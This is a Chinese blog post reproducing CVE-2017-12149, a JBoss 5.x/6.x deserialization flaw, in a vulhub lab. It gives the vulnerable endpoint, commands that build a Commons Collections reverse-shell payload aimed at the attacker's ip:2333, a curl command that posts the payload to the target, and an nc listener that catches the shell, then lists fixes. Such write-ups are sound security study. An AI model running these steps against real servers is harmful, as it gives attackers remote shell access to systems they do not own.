# 漏洞复现-CVE-2017-12149-jboss 反序列化 - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/15237415.html`](https://www.cnblogs.com/cute-puli/p/15237415.html)

# 0x00 实验环境

攻击机：Win 10

靶场：docker 拉的 vulhub 靶场

# 0x01 影响版本

实验版本 jboss:as-6.1.0，对版本低于 7.x 的有影响，即：**5.x**和**6.x**版本

# 0x02 漏洞复现

（1）存在漏洞的页面：

```
http://x.x.x.x:8080/invoker/readonly
```

![](img/76c9a8c5b3b16f51af81ac2074b3081a.png)

（2）说是这里存在反序列化，不太懂 java 代码，等以后学了这个再看看吧。

![](img/07c2d03389c60c1a741bbf0826d48b7e.png)

```
序列化：
FileOutputStream fos = new FileOutputStream(file); 
ObjectOutputStream oos = new ObjectOutputStream(fos); 
oos.writeObject(st); 
```

```
反序列化：
FileInputStream fis = new FileInputStream(file); 
ObjectInputStream ois = new ObjectInputStream(fis); 
Student st1 = (Student) ois.readObject();
```

（3）两种拿权限方式：

**方式一：**

直接使用现有的工具：

![](img/a5ea19c9002b90dc0e0e53295b226840.png)

**方式二：**

使用反序列化：

（1）下载工具（工具一概不提供，本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。）：

![](img/4632c4529c26fad5175f6341302c52ab.png)

（2）生成一个 ser 的 exp：

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:2333   
```

![](img/e2d1d939a9cc109254512818adf04daa.png)

（3）执行攻击：

```
curl http://xx.xx.xx.xx:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

（4）2333 端口开启监听后将收到 shell：

```
nc -lvp 2333
```

![](img/bc1eeae1b01f88e9337a1263b4176f8d.png)

# 0x03 漏洞修复

1、升级 jboss 为**7.x**版本

2、删除**/invoker/readonly**接口

# 0x04 免责声明

本漏洞复现文章仅用于学习、工作与兴趣爱好，并立志为网络安全奉献一份力量，凡是利用本博客相关内容的无良**hackers**造成的安全事故均与本人无关